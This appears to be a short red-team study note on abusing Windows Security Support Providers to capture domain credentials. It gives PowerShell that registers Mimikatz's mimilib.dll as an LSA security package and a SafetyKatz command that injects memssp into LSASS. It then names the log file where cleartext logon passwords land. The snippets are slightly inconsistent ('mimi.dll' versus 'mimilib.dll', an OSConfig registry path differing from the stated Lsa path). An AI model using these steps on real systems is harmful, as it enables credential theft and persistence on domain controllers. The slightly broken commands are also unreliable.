A security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection.
Some SSP Packages are:
- NTLM
- Kerberos
- Wdigest
- CredSSP

Mimikatz provides a custom SSP `mimilib.dll`.
- This SSP logs local logons, service account and machine account passwords in clear text on the target server.


> [!important] 
> you can use a custom SSP if you have administration privileges on the target.


# 1. How to exploit it

## 1.1 `mimilib.dll`
We can drop the `mimi.dll` to `System32` and add it to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:
```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'
$packages += `mimilib`

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -name 'Security Packages' -value $packages
```

## 1.2 Using mimikatz
We can also inject `LSASS`:
```powershell
SafetyKatz.exe -Command '"misc::memssp"'
```
- This is not stable with Server 2019 and 2022 but it is still usable

# 2. Collect data
All the local logons on the DC are logget to:
`C:\Windows\system32\mimilsa.log`:
- ![[Pasted image 20261124151518.png]]

> [!important]
> Also in this case we need admin privileges to read the file 